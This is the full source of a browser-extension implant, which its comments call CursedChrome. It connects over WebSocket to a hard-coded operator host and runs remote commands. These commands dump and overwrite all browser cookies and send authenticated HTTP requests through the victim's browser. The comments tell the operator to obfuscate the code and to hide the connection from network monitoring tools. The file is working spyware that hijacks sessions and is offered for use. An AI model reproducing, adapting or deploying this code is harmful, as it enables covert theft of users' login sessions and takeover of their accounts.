/*
    IMPORTANT: This script should be minified using UglifyJS or
    some other minimizer to remove comments/console.log statements
    and to obfuscate the code before deployment.

    You'll also need to modify the "websocket" variable in the
    initialize() function in this script with the appropriate
    connection URI for your host. For simple testing, the default
    connection string of "ws://127.0.0.1:4343" should be fine.
*/
var websocket = false;
var redirect_hack_id = "";
var last_live_connection_timestamp = get_unix_timestamp();
var placeholder_secret_token = get_secure_random_token(64);
const REDIRECT_STATUS_CODES = [
    301,
    302,
    307
];
// Used as a table to hold the final metadata to return for
// 301 requests which fetch() can't normally handle.
var redirect_table = {};

const REQUEST_HEADER_BLACKLIST = [
    'cookie'
];

const RPC_CALL_TABLE = {
    'HTTP_REQUEST': perform_http_request,
    'PONG': () => {}, // NOP, since timestamp is updated on inbound message.
    'AUTH': authenticate,
    'GET_COOKIES': get_cookies,
    'SET_COOKIES': set_cookies
};

/*
    Return an array of cookies for the current cookie store.
*/
function clear_cookie(url, name) {
    return new Promise(function(resolve, reject) {
        try {
        	chrome.cookies.remove({
        		url: url,
        		name: name
        	}, () => {
        		resolve();
        	});
        } catch(e) {
            reject(e);
        }
    });
}

function get_url_from_cookie_data(cookie_data) {
	const protocol = cookie_data.secure ? 'https' : 'http';
	var host = cookie_data.domain;
	if(host.startsWith('.')) {
		host = host.substring(1);
	}

	return `${protocol}://${host}${cookie_data.path}`;
}
async function set_cookies(cookies){
    const attrs_to_copy = [
        'domain',
        'expirationDate',
        'httpOnly',
        'name',
        'path',
        'sameSite',
        'secure',
        'value'
    ];

    const browser_cookie_array = cookies.map(cookie => {
        let cookie_data = {};
        attrs_to_copy.map(attribute_name => {
            // Firefox and Chrome compatibility bullshit
            if(attribute_name === 'sameSite' && cookie[attribute_name] === 'unspecified') {
                cookie_data[attribute_name] = 'lax';
                return
            }

            if(attribute_name in cookie) {
                cookie_data[attribute_name] = cookie[attribute_name];
            }
        });

        // For some reason we have to generate this even though
        // we already provide a domain, path, and secure param...
        const url = get_url_from_cookie_data(cookie_data);
        cookie_data.url = url;

        return cookie_data;
    });

    const existing_cookies = await getallcookies({});
    const cookie_clear_promises = existing_cookies.map(async existing_cookie => {
        const url = get_url_from_cookie_data(existing_cookie);
        return clear_cookie(url, existing_cookie.name);
    });
    await Promise.all(cookie_clear_promises);

    browser_cookie_array.map(cookie => {
        chrome.cookies.set(cookie, () => {});
    });
}
async function get_cookies(params) {
    // If the "cookies" permission is not available
    // just return an empty array.
    if(!chrome.cookies) {
        return [];
    }
    if(params)
        return getallcookies(params)
    else
        return getallcookies({});
}

function getallcookies(details) {
    return new Promise(function(resolve, reject) {
        try {
            chrome.cookies.getAll(details, function(cookies_array) {
                resolve(cookies_array);
            });
        } catch(e) {
            reject(e);
        }
    });
}

async function authenticate(params) {
    // Check for a previously-set browser identifier.
    
   
    var obj = await chrome.storage.local.get("browser_id");
    if(Object.keys(obj).length == 0) {
        browser_id = uuidv4();
        chrome.storage.local.set({
            'browser_id':
            browser_id
        });
    }else{
        browser_id = obj.browser_id;
    }
         
    return {
        'browser_id': browser_id,
        'user_agent': navigator.userAgent,
        'timestamp': get_unix_timestamp()
    }

}
function get_secure_random_token(bytes_length) {
    const validChars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let array = new Uint8Array(bytes_length);
    crypto.getRandomValues(array);
    array = array.map(x => validChars.charCodeAt(x % validChars.length));
    const random_string = String.fromCharCode.apply(null, array);
    return random_string;
}

function uuidv4() {
  return ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
    (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
  );
}

function arrayBufferToBase64(buffer) {
    var binary = '';
    var bytes = new Uint8Array(buffer);
    var len = bytes.byteLength;
    for (var i = 0; i < len; i++) {
        binary += String.fromCharCode(bytes[i]);
    }
    return btoa(binary);
}

function get_unix_timestamp() {
    return Math.floor(Date.now() / 1000);
}

// Checks the websocket connection to ensure it's still live
// If it's not, then we attempt a reconnect
const websocket_check_interval = setInterval(() => {
    const PENDING_STATES = [
        0, // CONNECTING
        2 // CLOSING
    ];

    // Check WebSocket state and make sure it's appropriate
    if (PENDING_STATES.includes(websocket.readyState)) {
        console.log(`WebSocket not in appropriate state for liveness check...`);
        return
    }

    // Check if timestamp is older than ~15 seconds. If it
    // is the connection is probably dead and we should restart it.
    const current_timestamp = get_unix_timestamp();
    const seconds_since_last_live_message = current_timestamp - last_live_connection_timestamp;

    if (seconds_since_last_live_message > 29 || websocket.readyState === 3) {
        console.error(`WebSocket does not appear to be live! Restarting the WebSocket connection...`);

        try {
            websocket.close();
        } catch (e) {
            // Do nothing.
        }
        initialize();
        return
    }

    // Send PING message down websocket, this will be
    // replied to with a PONG message form the server
    // which will trigger a function to update the 
    // last_live_connection_timestamp variable.

    // If this timestamp gets too old, the WebSocket
    // will be severed and started again.
    websocket.send(
        JSON.stringify({
            'id': uuidv4(),
            'version': '1.0.0',
            'action': 'PING',
            'data': {}
        })
    );
}, (1000 * 3));

// Headers that fetch() can't set which need to
// utilize webRequest to be able to send properly.
const HEADERS_TO_REPLACE = [
    'origin',
    'referer',
    'access-control-request-headers',
    'access-control-request-method',
    'access-control-allow-origin',
    'date',
    'dnt',
    'trailer',
    'upgrade'
];

async function perform_http_request(params) {
    // Whether to include cookies when sending request
    const credentials_mode = params.authenticated ? 'include' : 'omit';

    // Set the X-PLACEHOLDER-SECRET to the generated secret.
    params.headers['X-PLACEHOLDER-SECRET'] = placeholder_secret_token;

    // List of keys for headers to replace with placeholder headers
    // which will be replaced on the wire with the originals.
    var headers_to_replace = [];

    // Loop over headers and find any that need to be replaced.
    const header_keys = Object.keys(params.headers);
    header_keys.map(header_key => {
        if (HEADERS_TO_REPLACE.includes(header_key.toLowerCase())) {
            headers_to_replace.push(
                header_key
            );
        }
    });
    // Then replace all headers with placeholder headers
    headers_to_replace.map(header_key => {
        const new_header_key = `X-PLACEHOLDER-${header_key}`
        params.headers[new_header_key] = params.headers[header_key];
        delete params.headers[header_key];
    });

    var request_options = {
        method: params.method,
        mode: 'cors',
        cache: 'no-cache',
        credentials: credentials_mode,
        headers: params.headers,
        redirect: 'follow'
    }

    // If there is a request body, we decode it
    // and set it for the request.
    if (params.body) {
        // This is a hack to convert base64 to a Blob
        const fetchURL = `data:application/octet-stream;base64,${params.body}`;
        const fetchResp = await fetch(fetchURL);
        request_options.body = await fetchResp.blob();
    }
    
    try {
        var response = await fetch(
            params.url,
            request_options
        );
    } catch (e) {
        console.error(`Error occurred while performing fetch:`);
        console.error(e);
        return;
    }
    var response_headers = {};
    for (var pair of response.headers.entries()) {
        
        // Fix Set-Cookie from onHeadersReceived (fetch() doesn't expose it)
        if (pair[0] === 'x-set-cookie') {
            // Original Set-Cookie may merge multiple headers, we have it packed
            response_headers['Set-Cookie'] = JSON.parse(pair[1]);
        }
        else {
            response_headers[pair[0]] = pair[1];
        }
    }

    // Handler 301, 302, 307 edge case
    // response status 30x case
    if(REDIRECT_STATUS_CODES.includes(response.status)) {
        var redirect_hack_headers = {};
        response.headers.map(header_data => {
            // Original Set-Cookie may merge multiple headers, skip it
            if (header_data.name.toLowerCase() !== 'set-cookie') {
                if (header_data.name === 'X-Set-Cookie') {
                    redirect_hack_headers['Set-Cookie'] = JSON.parse(header_data.value);
                }
                else {
                    redirect_hack_headers[header_data.name] = header_data.value;
                }
            }
        });
        const redirect_hack_data = {
            'url': response.url,
            'status': response.status,
            'status_text': 'Redirect',
            'headers': redirect_hack_headers,
            'body': '',
        };
        return redirect_hack_data;
    }else if(params.url  != response.url) {
        const redirect_hack_data = {
            'url': params.url,
            'status': 302,
            'status_text': 'Redirect',
            'headers': { location : response.url },
            'body': '',
        };
        return redirect_hack_data;
    }
    // Handler 301, 302, 307 edge case
    // no response for 30x
    

    return {
        'url': response.url,
        'status': response.status,
        'status_text': response.statusText,
        'headers': response_headers,
        'body': arrayBufferToBase64(
            await response.arrayBuffer()
        )
    }
}

function initialize() {
    // Replace the below connection URI with whatever
    // the host details you're using are.
    // ** Ideal setup is the following **
    // Have Nginx doing a reverse-proxy (proxy_pass) to
    // the CursedChrome server with a HTTPS cert setup. 
    // For SSL/TLS WebSockets, instead of https:// you need
    // to use wss:// as the protocol. For maximum stealth,
    // setting the WebSocket port to be the standard 
    // TLS/SSL port (this will make sure tools like little
    // snitch don't alert on a new port connection from Chrome).
    websocket = new WebSocket("ws://192.168.11.129:4343");

    websocket.onopen = function(e) {
        //websocket.send("My name is John");
    };

    websocket.onmessage = async function(event) {
        // Update last live connection timestamp
        last_live_connection_timestamp = get_unix_timestamp();

        try {
            var parsed_message = JSON.parse(
                event.data
            );
        } catch (e) {
            console.error(`Could not parse WebSocket message!`);
            console.error(e);
            return
        }

        if (parsed_message.action in RPC_CALL_TABLE) {
            const result = await RPC_CALL_TABLE[parsed_message.action](parsed_message.data);
            websocket.send(
                JSON.stringify({
                    // Use same ID so it can be correlated with the response
                    'id': parsed_message.id,
                    'origin_action': parsed_message.action,
                    'result': result,
                })
            )
        } else {
            console.error(`No RPC action ${parsed_message.action}!`);
        }
    };

    websocket.onclose = function(event) {
        if (event.wasClean) {
            console.log(`[close] Connection closed cleanly, code=${event.code} reason=${event.reason}`);
        } else {
            // e.g. server process killed or network down
            // event.code is usually 1006 in this case
            console.log('[close] Connection died');
        }
    };

    websocket.onerror = function(error) {
        console.log(`[error] ${error.message}`);
    };
}

initialize();

